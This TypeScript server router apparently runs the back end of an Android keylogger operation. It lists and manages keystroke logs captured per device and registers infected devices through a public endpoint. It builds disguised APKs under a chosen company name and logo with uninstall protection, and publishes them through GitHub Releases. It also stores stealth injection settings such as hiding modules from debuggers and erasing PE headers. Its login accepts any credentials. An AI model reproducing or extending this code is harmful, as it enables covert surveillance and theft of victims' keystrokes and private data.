import z from "zod";
import fs from "fs";
import path from "path";

import { storagePut } from "./storage";
import { TRPCError } from "@trpc/server";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { buildCustomAPK } from "./apk-builder";
import { generateAPKWrapper } from "./apk-wrapper-generator";
import { generateSimpleAPKWrapper } from "./apk-wrapper-simple";
import { buildProfessionalAPK } from "./apk-builder-professional";
import { buildSimpleProductionAPK } from "./apk-builder-simple-production";
import { buildCustomizedAPK } from "./apk-builder-customized";
import { buildAdvancedAPK } from "./apk-builder-advanced";
import { generateMemoryAPKUrl } from "./apk-builder-memory";
import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
import { sdk } from "./_core/sdk";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    login: publicProcedure
      .input(z.object({
        email: z.string().email(),
        password: z.string().min(1),
      }))
      .mutation(async ({ input, ctx }) => {
        // Simple authentication: accept any email/password combination
        // Generate a numeric userId based on email hash
        const emailHash = input.email.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
        const userId = Math.abs(emailHash % 1000000); // Ensure it's a positive number
        
        try {
          // Create a session token
          const sessionToken = await sdk.createSessionToken(userId, input.email);
          
          // Set the session cookie
          const cookieOptions = getSessionCookieOptions(ctx.req);
          ctx.res.cookie(COOKIE_NAME, sessionToken, cookieOptions);
          
          return {
            success: true,
            user: {
              id: userId,
              email: input.email,
              name: input.email.split('@')[0],
            },
          };
        } catch (error) {
          console.error('Login error:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao fazer login',
          });
        }
      }),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await deleteKeylog(input.keylogId);
      }),
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await restoreKeylog(input.keylogId);
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getAlerts();
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getEvents();
      }),
  }),

  apk: router({
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
        protectFromUninstall: z.boolean().default(true),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          console.log('[ROUTER] APK build requested:', { companyName: input.companyName, companyUrl: input.companyUrl });
          
          // Use customized APK builder to change app name and package name
          console.log('[ROUTER] Building APK with customized builder...');
          const result = await buildCustomizedAPK({
            appName: input.companyName,
            appUrl: input.companyUrl,
            logoUrl: input.logoUrl,
          });
          
          console.log('[ROUTER] Customized builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });

          if (!result.success || !result.downloadUrl) {
            throw new Error(result.error || "Erro ao gerar APK");
          }

          // Extract filename from download URL
          const filename = result.downloadUrl.split('/').pop() || 'app.apk';
          console.log('[ROUTER] Extracted filename:', filename);
          
          // Try to upload to GitHub Releases if token is available
          let finalDownloadUrl = result.downloadUrl; // Start with local URL as fallback
          
          console.log('[ROUTER] === GitHub Upload Attempt ===');
          console.log('[ROUTER] GITHUB_TOKEN present:', !!process.env.GITHUB_TOKEN);
          console.log('[ROUTER] GITHUB_REPO_URL:', process.env.GITHUB_REPO_URL);
          console.log('[ROUTER] result.apkPath:', result.apkPath);
          
          if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.apkPath) {
            try {
              console.log('[ROUTER] ✓ All GitHub requirements met, attempting upload...');
              
              const repoUrl = process.env.GITHUB_REPO_URL;
              const { owner, repo } = parseGitHubUrl(repoUrl);
              console.log('[ROUTER] Parsed GitHub repo:', { owner, repo });
              
              const githubUrl = await uploadToGitHubRelease({
                owner,
                repo,
                token: process.env.GITHUB_TOKEN,
                appName: input.companyName,
                filePath: result.apkPath,
              });
              
              console.log('[ROUTER] ✓ GitHub release upload SUCCESSFUL!');
              console.log('[ROUTER] GitHub download URL:', githubUrl);
              finalDownloadUrl = githubUrl;
            } catch (githubError) {
              console.error('[ROUTER] ✗ GitHub release upload FAILED:', githubError instanceof Error ? githubError.message : String(githubError));
              console.warn('[ROUTER] Falling back to local URL:', result.downloadUrl);
              // Continue with fallback URL if GitHub upload fails
            }
          } else {
            console.log('[ROUTER] ✗ GitHub upload skipped - missing requirements');
            console.log('[ROUTER] - GITHUB_TOKEN:', !!process.env.GITHUB_TOKEN);
            console.log('[ROUTER] - GITHUB_REPO_URL:', !!process.env.GITHUB_REPO_URL);
            console.log('[ROUTER] - result.apkPath:', !!result.apkPath);
          }
          
            return {
              success: true,
              downloadUrl: finalDownloadUrl,
              apkPath: result.apkPath,
              filename: filename,
              message: "APK gerado com sucesso!",
            };
        } catch (error) {
          console.error("Erro ao gerar APK:", error);
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
    
    download: publicProcedure
      .input(z.object({
        filename: z.string().min(1),
      }))
      .query(async ({ input }) => {
        try {
          console.log('[APK] Download requested for:', input.filename);
          
          if (input.filename.includes('..') || input.filename.includes('/')) {
            throw new Error('Invalid filename');
          }
          
          const apksDir = process.env.NODE_ENV === 'production'
            ? '/app/public/apks'
            : path.join(process.cwd(), 'public/apks');
          
          console.log('[APK] APKs directory:', apksDir);
          console.log('[APK] NODE_ENV:', process.env.NODE_ENV);
          
          const filepath = path.join(apksDir, input.filename);
          console.log('[APK] Full filepath:', filepath);
          
          if (!fs.existsSync(apksDir)) {
            console.error('[APK] APKs directory does not exist:', apksDir);
            throw new Error(`APKs directory not found: ${apksDir}`);
          }
          
          const filesInDir = fs.readdirSync(apksDir);
          console.log('[APK] Files in directory:', filesInDir);
          
          if (!fs.existsSync(filepath)) {
            throw new Error(`APK file not found at ${filepath}`);
          }
          
          const fileBuffer = fs.readFileSync(filepath);
          const base64 = fileBuffer.toString('base64');
          
          return {
            success: true,
            filename: input.filename,
            data: base64,
            size: fileBuffer.length,
          };
        } catch (error) {
          console.error('[APK] Download error:', error);
          throw new Error(`Erro ao baixar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),

  settings: router({
    save: protectedProcedure
      .input(z.object({
        processName: z.string().optional(),
        modulePath: z.string().optional(),
        stealthInject: z.number().optional(),
        hideModule: z.number().optional(),
        hideFromDebugger: z.number().optional(),
        autoInject: z.number().optional(),
        scramble: z.number().optional(),
        erasePE: z.number().optional(),
        removeDebugData: z.number().optional(),
        delay: z.number().optional(),
        delayBetween: z.number().optional(),
        injectMethod: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await saveSettings(ctx.user.id, input as any);
      }),
    
    get: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await getSettings(ctx.user.id);
      }),
  }),

  monitoring: router({
    toggleService: protectedProcedure
      .input(z.object({
        enabled: z.boolean(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return {
          success: true,
          enabled: input.enabled,
          message: `MonitoringService ${input.enabled ? 'ativado' : 'desativado'}`,
        };
      }),
  }),

  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        deviceName: z.string(),
        deviceModel: z.string(),
        androidVersion: z.string(),
        appName: z.string(),
        appUrl: z.string().optional(),
        appVersion: z.string(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[Devices] Registrando dispositivo:', input);
          
          const device = await registerDevice({
            deviceId: input.deviceId,
            userId: 1,
            appName: input.appName,
            appUrl: input.appUrl || '',
            deviceModel: input.deviceModel,
            androidVersion: input.androidVersion,
            appVersion: input.appVersion,
            status: 'online',
          });
          
          return {
            success: true,
            message: 'Dispositivo registrado com sucesso',
            deviceId: input.deviceId,
            device,
          };
        } catch (error) {
          console.error('[Devices] Erro ao registrar dispositivo:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao registrar dispositivo',
          });
        }
      }),
    
    list: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        try {
          const devices = await getDevicesByUser(ctx.user.id);
          return devices;
        } catch (error) {
          console.error('[Devices] Erro ao listar dispositivos:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao listar dispositivos',
          });
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
